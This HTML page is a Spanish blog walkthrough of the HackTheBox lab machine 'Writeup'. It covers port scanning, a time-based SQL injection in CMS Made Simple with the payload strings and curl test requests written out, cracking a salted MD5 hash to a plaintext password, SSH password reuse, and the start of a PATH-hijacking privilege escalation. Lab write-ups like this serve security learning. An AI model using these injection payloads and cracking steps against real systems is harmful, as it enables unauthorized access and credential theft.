@@ -1,0 +1,1245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Writeup</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Writeup | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Writeup" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel fácil, nos miraremos a los ojos con un CMS vulnerable a SQLi time-based. Haremos reutilización de credenciales y encontraremos un PATH Hijacking guapetón." />
+<meta property="og:description" content="Máquina Linux nivel fácil, nos miraremos a los ojos con un CMS vulnerable a SQLi time-based. Haremos reutilización de credenciales y encontraremos un PATH Hijacking guapetón." />
+<link rel="canonical" href="http://localhost:4000/htb/writeup" />
+<meta property="og:url" content="http://localhost:4000/htb/writeup" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-09T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192banner.png" />
+<meta property="twitter:title" content="HackTheBox - Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-06-09T00:00:00-07:00","datePublished":"2021-06-09T00:00:00-07:00","description":"Máquina Linux nivel fácil, nos miraremos a los ojos con un CMS vulnerable a SQLi time-based. Haremos reutilización de credenciales y encontraremos un PATH Hijacking guapetón.","headline":"HackTheBox - Writeup","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/writeup"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/writeup"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-06-09">09 Jun 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192banner.png" alt="HackTheBox - Writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina <strong>Linux</strong> nivel fácil, nos miraremos a los ojos con un <strong>CMS</strong> vulnerable a <strong>SQLi time-based</strong>. Haremos reutilización de credenciales y encontraremos un <strong>PATH Hijacking</strong> guapetón.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192writeupHTB.png" alt="192writeupHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/77141">jkr</a>.</p>
+
+<p>Bueno vueno weno, vamos inicialmente a encontrarnos con el gestor de contenido (CMS) <strong>Made-Simple</strong>, relacionaremos una explotación <strong>SQL</strong> basada en tiempo con el gestor, jugaremos y lograremos dumpear unas credenciales del usuario <strong>jkr</strong>.</p>
+
+<p>Tendremos en mente que las credenciales obtenidas solo son válidas contra el <em>CMS</em>, pero haciendo reutilización de contraseñas conseguimos una sesión en la máquina mediante <strong>SSH</strong> como el usuario <strong>jkr</strong>.</p>
+
+<p>Enumerando si existen tareas programadas, veremos que cuando un usuario ingresa por <strong>SSH</strong> se hace el llamado al programa <strong><em>run-parts</em></strong>, peeeeeeero es llamado como tal, sin ruta absoluta. Esto nos dará el impulso para pensar en un ataque tipo <strong>PATH Hijacking</strong>, teniendo esto en cuenta y que el usuario <strong><em>jkr</em></strong> está en el grupo <strong>staff</strong> lograremos obtener una reverse Shell como el usuario <strong>root</strong>.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Vulnerabilidades conocidas (probablemente por eso el nombre de la máquina) y va 🧗 ante el realismo.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>a e i o uuuuuuuuuuuuuuuuuuuuuuuuuu.</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Vamos a empezar escaneando los puertos con <strong>nmap</strong>, así podemos ir encontrando alguna ruta de explotación/exploración ante la máquina:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.138 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Como resultado obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Fri Jun  4 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.138
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.138 () Status: Up
+Host: 10.10.10.138 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///  Ignored State: filtered (65533)
+# Nmap done at Fri Jun  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 276.14 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/">SSH</a></strong></td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>~(Para copiar los puertos directamente en la clipboard (aunque sean 2), hacemos uso de la función referenciada antes</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.138
+    [*] Open ports: 22,80
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<p>Ahora hacemos un escaneo de scripts y versiones de cada puerto encontrado, así hacemos más directa nuestra investigación:</p>
+
+<pre><code class="language-bash">❱ nmap -p 22,80 -sC -sV 10.10.10.138 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Validamos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Fri Jun  4 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.138
+Nmap scan report for 10.10.10.138
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
+|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
+|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/writeup/
+|_http-title: Nothing here yet.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jun  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 10.67 seconds
+</code></pre>
+
+<p>Cositas relevantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 7.4p1 Debian 10+deb9u6</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.25 ((Debian))</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>El puerto <strong>80</strong> tiene una entrada “escondida” llamada <code>/writeup/</code>.</li>
+</ul>
+
+<p>Empecemos a explorar a ver que encontramos…</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192page80.png" alt="192page80" /></p>
+
+<p>Podemos destacar varias cositas:</p>
+
+<ul>
+  <li><strong>Donkey DoS</strong>.</li>
+  <li><strong>jkr</strong>: Probable usuario de “algo”.</li>
+  <li><strong>writeup.htb</strong>: Dominio a tener en cuenta.</li>
+</ul>
+
+<p>Veamos el recurso <code>/writeup/</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192page80_robotsTXT.png" alt="192page80_robotsTXT" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192page80_writeup.png" alt="192page80_writeup" /></p>
+
+<p>Bien, simplemente tiene algunos “writeups” (fragmentos) de otras máquinas de la plataforma, pero nada relevante…</p>
+
+<p>Jugando con <a href="https://www.google.com/search?client=firefox-b-d&amp;q=wappalyzer">Wappalyzer</a> y <a href="http://todolinux.cl/wordpress/2015/12/19/whatweb-el-primer-reconocimiento-web/">whatweb</a> vemos algo interesante:</p>
+
+<pre><code class="language-bash">❱ whatweb http://10.10.10.138/writeup
+</code></pre>
+
+<p>Nos responde con 2 peticiones, una hacia <code>/writeup</code> y otra hacia <code>/writeup/</code>:</p>
+
+<pre><code class="language-bash">http://10.10.10.138/writeup [301 Moved Permanently] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], RedirectLocation[http://10.10.10.138/writeup/], Title[301 Moved Permanently]
+</code></pre>
+
+<p>Hacia <code>/writeup/</code> está lo llamativo:</p>
+
+<pre><code class="language-bash">http://10.10.10.138/writeup/ [200 OK] Apache[2.4.25], CMS-Made-Simple, Cookies[CMSSESSID9d372ef93962], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.], Title[Home - writeup]
+</code></pre>
+
+<p>Un gestor de contenido llamado <a href="https://en.wikipedia.org/wiki/CMS_Made_Simple">CMS-Made-Simple</a>, no tenemos nada más, pero al menos sabemos el software que esta detrás de la web (: Ahora podemos (como prueba de siempre) buscar algunos exploits relacionados con él y ver si nuestra web es vulnerable a ellos 🕴️</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Haciendo una búsqueda rápida como: <code>cms made simple exploit</code>, nos encontramos uno llamativo:</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/46635">CMS Made Simple &lt; 2.2.10 - SQL Injection</a>.
+    <ul>
+      <li><a href="https://vuldb.com/?id.132463">CMS Made Simple up to 2.2.8 <strong>m1_idlist</strong> Time-Based SQLi</a>.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Se trata de una <a href="https://www.sqlinjection.net/time-based/">inyección <strong>SQL</strong> basada en tiempo</a>, no se necesita autenticación ni cosas extra. Las peticiones que hace, giran en torno a una en específico, si esa no nos diera respuesta, este exploit no nos funcionaría:</p>
+
+<pre><code class="language-py">...
+url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
+...
+</code></pre>
+
+<p>Donde <code>options.url</code> sería la URL que le pasemos, en nuestro caso: <code>http://10.10.10.138/writeup</code>.</p>
+
+<p>Si validamos esa petición en la web, obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192page80_moduleinterfacePHP_done.png" alt="192page80_moduleinterfacePHP_done" /></p>
+
+<p>Bien, nos responde, no hay nada interesante en el texto, peeeeeeeeeero hemos confirmado que existe esa URL, por lo tanto podemos probar ahora si el exploit funciona. Lo descargamos y ejecutamos:</p>
+
+<p><strong>(Originalmente el exploit está hecho en **Python 2.x</strong>, pero tengo un problema con la librería <code>requests</code> en esa versión de <strong>Py</strong>, <em>por suerte</em> cambiando los <code>print ..</code> por <code>print(..)</code> nos permite ejecutar el programa con <strong>Python 3</strong> sin problemas)**</p>
+
+<pre><code class="language-bash">❱ python3 cms_made_simple_SQLi.py 
+[+] Specify an url target
+[+] Example usage (no cracking password): exploit.py -u http://target-uri
+[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
+[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
+</code></pre>
+
+<pre><code class="language-bash">❱ python3 cms_made_simple_SQLi.py -u http://10.10.10.138/writeup
+</code></pre>
+
+<p>Y despues de un rato (al ser <strong>time-based</strong>, claramente es “demorado”) obtenemos esto con base en la información de la base de datos del <strong>CMS</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192bash_cmsmadesimpleSQLi_done.png" alt="192bash_cmsmadesimpleSQLi_done" /></p>
+
+<p>Bien, nos extrae en concreto la data de un usuario llamado <strong>jkr</strong> en la base de datos usada por el <strong>CMS</strong>, ¿pero como pasa esto?, bueno, enfoquémonos en como obtiene por ejemplo el valor <strong><em>salt</em></strong> de la <strong><em>password</em></strong>.</p>
+
+<h4 id="-entendemos-la-inyección-sql-basada-en-tiempo">🧿 Entendemos la inyección SQL basada en tiempo</h4>
+
+<p>En el script usa esta sentencia:</p>
+
+<pre><code class="language-py">...
+payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"   
+...
+</code></pre>
+
+<p>Y así viaja la petición:</p>
+
+<pre><code class="language-py">...
+url = url_vuln + "&amp;m1_idlist=" + payload
+...
+</code></pre>
+
+<p>Si nos fijamos en el <strong>payload</strong> vemos varias cosillas:</p>
+
+<p><span style="color: red;">1. </span><code>a,b,1,5))</code>:</p>
+
+<p>Es cuestión de jugar, entiendo que el que encontró la vulnerabilidad hizo eso, probar vaaaarias letras y números y concatenarlo con alguna inyección básica y ver cuál le daba resultado, por ejemplo <code>c,a,1))...</code> también funciona como <strong>payload</strong>. Siempre es cuestión de jugar y probar cosas…</p>
+
+<p><span style="color: red;">2. </span><code>+</code>:</p>
+
+<p>Los usa como “encoders” de los espacios, ya que si ejecutamos la sentencia (<strong>en la web</strong>) sin esos “+”, no se ejecuta la explotación.</p>
+
+<p><span style="color: red;">3. </span>La parte interesante:</p>
+
+<p>…</p>
+
+<p>Si quisiéramos validar algún <strong>SQL blind</strong> time-based en este caso, ejecutando algo tan sencillo como:</p>
+
+<pre><code class="language-bash"># Respuesta inmediata
+❱ time curl "http://10.10.10.138/writeup/moduleinterface.php?mact=News,m1_,default,0&amp;m1_idlist=a,b,1,5"
+real    0m0,253s
+user    0m0,009s
+sys     0m0,003s
+...
+# 3 segundos de delay si hay ejecucion exitosa :)
+❱ time curl "http://10.10.10.138/writeup/moduleinterface.php?mact=News,m1_,default,0&amp;m1_idlist=a,b,1,5))+and+sleep(3)+--+"   
+...
+real    0m3,474s
+user    0m0,009s
+sys     0m0,008s
+</code></pre>
+
+<p>Y vemos los 3 segundos… Ya con lo que juguemos despues del <strong>and</strong> es inyección <strong>SQL</strong> (:</p>
+
+<p>…</p>
+
+<p>Ahora si e.e</p>
+
+<pre><code class="language-sql">+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+
+</code></pre>
+
+<p>Donde le indica que seleccione (<a href="http://sql.11sql.com/sql-select.htm">SELECT</a>) algo, (si lo encuentra ejecuta <code>sleep(1)</code> (en el script <strong>TIME</strong> vale <code>1</code>), o sea, <strong>hace un delay en la respuesta de un segundo (1)</strong>) de (<a href="https://www.w3schools.com/sql/sql_ref_from.asp">FROM</a>) la tabla <code>cms_siteprefs</code> donde (<a href="https://estradawebgroup.com/Post/Aprende-a-utilizar-las-condiciones-con-la-clausula-WHERE-de-SQL-/4297">WHERE</a>) el valor de la columna <code>sitepref_value</code> <strong>en este caso</strong> empiece con (leyendo sobre <strong>LIKE</strong> se entenderá el porqué, igual abajo lo digo) (<a href="https://www.w3schools.com/sql/sql_like.asp">LIKE</a> <code>...%</code>) el valor de la variable <code>ord_salt_temp</code>:</p>
+
+<blockquote>
+  <p>Que toma el valor de cada letra con la que va iterando, ejemplo, prueba la <code>a</code> (¿empieza por con <code>a</code>?), la <code>b</code> (¿empieza con <code>b</code>?) y asi, eso va conformando ese valor, peeeeero no literalmente, lo pasa primero a decimal (valor ASCII del caracter) y despues a hexadecimal, ese si seria el resultado de la variable <code>ord_salt_temp</code>. Si algun caracter ejecuta el <strong>sleep</strong>, toma ese char y lo guarda para al final conformar (en este caso) el <strong>salt</strong> completo (:</p>
+  <blockquote>
+    <p>¿empieza con <code>a</code>? si, guarda la <code>a</code> y ahora haría: ¿empieza con <code>ab</code>? si, y etc e.e</p>
+  </blockquote>
+</blockquote>
+
+<p>El valor del <strong>LIKE</strong> por ejemplo con la letra <code>a</code> quedaría así:</p>
+
+<pre><code class="language-sql">... like 0x6125+and...`
+</code></pre>
+
+<p>El <strong>25</strong> de <strong>hex</strong> a <strong>Ascii</strong> significa <code>%</code> (esto es sintaxis del propio <a href="https://www.w3schools.com/sql/sql_like.asp">LIKE</a>).</p>
+
+<p><strong>(Quizás me explique fatal, pero es sencillo de entender una vez miras el script)</strong></p>
+
+<p>Y finalmente le añade a la búsqueda que el valor de la columna <code>sitepref_name</code> se parezca al valor hexadecimal <code>0x736974656d61736b</code> (que significa <code>sitemask</code> en <strong>Ascii</strong>)…</p>
+
+<p>Con esto es que se consigue la explotación (: Ya va variando según lo que se quiera conseguir :)</p>
+
+<p>…</p>
+
+<p>Validando en internet que tipo de hash es, corroboramos que es tipo <a href="https://www.nerion.es/blog/cifrado-md5/">MD5</a>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192google_hashid_jkr.png" alt="192google_hashid_jkr" /></p>
+
+<p>Podemos agregarle el valor <a href="https://es.quora.com/Qu%C3%A9-significa-agregar-un-salt-a-una-contrase%C3%B1a-hash">salt</a> para terminar de confirmar que el formato del hash está bien:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192google_hashidwithsalt_jkr.png" alt="192google_hashidwithsalt_jkr" /></p>
+
+<p>Listones, todo perfeeeeeeecto.</p>
+
+<p>Usando <a href="https://attackdefense.com/challengedetailsnoauth?cid=52">esta guía</a> sobre “<em>Cracking Salted MD5 Hashes</em>”, podemos empezar a jugar:</p>
+
+<p>Generamos un archivo que contenga el <strong>hash</strong> y la <strong>salt</strong>:</p>
+
+<pre><code class="language-bash">❱ cat madeSimple_jkr.hash 
+62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
+</code></pre>
+
+<p>Y ahora con <strong>hashcat</strong> pasamos data en algunos parámetros:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-m</td>
+      <td style="text-align: left">Toma el tipo de hash con el que estamos tratando.</td>
+    </tr>
+    <tr>
+      <td>-a</td>
+      <td style="text-align: left">Le indicamos el tipo de ataque que haremos, usaremos <code>0</code>, así entenderá que es un <code>dictionary-attack</code> (para poder hacer uso de <strong>wordlists</strong>).</td>
+    </tr>
+    <tr>
+      <td>&lt;hashfile&gt;</td>
+      <td style="text-align: left">Pos eso :P El archivo donde esta nuestro hash</td>
+    </tr>
+    <tr>
+      <td>&lt;wordlist&gt;</td>
+      <td style="text-align: left">Y el archivo que usaremos como lista de palabras :)</td>
+    </tr>
+    <tr>
+      <td>-o</td>
+      <td style="text-align: left">Para que nos guarde el resultado en el archivo que indiquemos.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Apoyándonos en <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">los ejemplos de hashes de <strong>hashcat</strong></a> logramos obtener el valor de <code>-m</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192google_wikiexample_md5salts.png" alt="192google_wikiexample_md5salts" /></p>
+
+<p>Dos opciones, probamos con las dos por si algo :P</p>
+
+<pre><code class="language-bash">❱ hashcat -m 10 -a 0 madeSimple_jkr.hash /usr/share/wordlists/rockyou.txt -o cracked_plain.txt
+...
+Status...........: Exhausted
+Hash.Name........: md5($pass.$salt)
+...
+</code></pre>
+
+<p>Con el tipo de hash <code>10</code> no obtenemos respuesta, probando con el <code>20</code>:</p>
+
+<pre><code class="language-bash">❱ hashcat -m 20 -a 0 madeSimple_jkr.hash /usr/share/wordlists/rockyou.txt -o cracked_plain.txt
+...
+Status...........: Cracked
+Hash.Name........: md5($salt.$pass)
+...
+</code></pre>
+
+<p>Opa, nos indica que fue crackeado, si validamos nuestro archivo <code>cracked_plain.txt</code> tenemos:</p>
+
+<pre><code class="language-bash">❱ cat cracked_plain.txt 
+62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
+</code></pre>
+
+<p>En valor en texto plano de ese hash y el salt es: <code>raykayjay9</code> 😵 Por lo tanto esa sería la contraseña del usuario <code>jkr</code> guardaba en la base de datos del <strong>CMS</strong>…</p>
+
+<p>Pero ¿Y si validamos si existe alguna reutilización de contraseñas por parte de <strong>jkr</strong>? Juguemos con el servicio <strong>SSH</strong> a ver si son válidas:</p>
+
+<pre><code class="language-bash">❱ ssh jkr@10.10.10.138
+jkr@10.10.10.138's password:   
+</code></pre>
+
+<p>Yyyyyyyyyyyyyyyyyyyyyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192bash_ssh_jkr_done.png" alt="192bash_ssh_jkr_done" /></p>
+
+<p>Perfessssto, tamos dentroooooooooooooooooooooooooo!</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Viendo los grupos en los que está el usuario <strong>jkr</strong>, vemos uno distinto a los usuales:</p>
+
+<pre><code class="language-bash">jkr@writeup:/$ id
+uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)   
+</code></pre>
+
+<p>El grupo <strong>staff</strong>…</p>
+
+<p>Buscando vemos que le permite a los usuarios que lo poseen <strong>añadir</strong> (o modificar) información en las rutas <code>/usr/local</code> y <code>/home</code> sin necesidad de privilegios, además:</p>
+
+<blockquote>
+  <p>La “habilidad” de modificar <code>/usr/local</code> es equivalente a tener acceso como root, ya que <code>/usr/local</code> esta intencionalmente en cuanto a las <em>rutas de busqueda</em> antes de <code>/usr</code>. <a href="https://www.chiark.greenend.org.uk/doc/base-passwd/users-and-groups.html">Users and groups - Debian</a>.</p>
+</blockquote>
+
+<p>La cita hace referencia a la variable <code>$PATH</code> del sistema, algunos procesos usan esa variable para buscar fuentes o binarios. Ahorita hablaremos de esto.</p>
+
+<p>Estuve un tiempo jugando con ese grupo y un <a href="https://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/">exploit que lo relacionaba</a>, pero no logre nada de ahí.</p>
+
+<p>Está claro que para poder hacer algo con ese grupo y la ruta <code>/usr/local</code> necesitamos algún indicio de alguna tarea o ejecución por parte del sistema y no por parte de <strong>jkr</strong>, ya que podemos escribir en la ruta <code>/usr/local/bin</code>, pero si lo ejecutamos, será ejecutado como <strong>jkr</strong> :(</p>
+
+<p>Enumerando los procesos internos (con base en lo dicho anteriormente), buscando alguna tarea cron o ejecución de la cual nos podamos aprovechar encontramos esto:</p>
+
+<blockquote>
+  <p>Usaremos <a href="https://github.com/DominicBreuker/pspy">pspy</a>, que según su propia descripcion nos pemite ver comandos ejecutados por otros usuarios, tareas programadas, etc.</p>
+</blockquote>
+
+<p>Lo bajamos a nuestra máquina (en nuestro caso comprobamos la arquitectura con el comando <code>lscpu</code> y vemos que estamos en una de <strong>64 bits</strong>, así que descargamos ese tipo de binario).</p>
+
+<p>Despues lo pasamos a la máquina y ejecutamos:</p>
+
+<pre><code class="language-bash">jkr@writeup:/tmp$ ./pspy64
+</code></pre>
+
